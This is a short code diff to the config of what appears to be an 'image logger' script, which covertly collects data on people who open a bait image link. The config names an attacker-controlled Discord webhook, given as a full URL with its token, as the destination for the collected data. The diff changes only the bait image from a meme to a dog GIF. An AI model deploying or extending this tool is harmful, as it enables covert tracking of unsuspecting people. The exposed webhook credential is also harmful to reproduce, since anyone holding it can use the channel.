@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1402242391154622505/GFc9ti4qY7KNHNRV-sShoW7S4PTvOi92CG0F-E3axop9ZGtOAzpSNi2CNooAiAmk1-KK",
-    "image": "https://www.memecenter.fr/files/2013/12/super-cool-ski-instructor-ne-mangez-pas-de-laxatif-sinon-vous-aurez-la-diaree-et-vous-passerez-un-mauvais-quart-dheure.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/6ebackS1P9wAAAAd/dog-staring.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
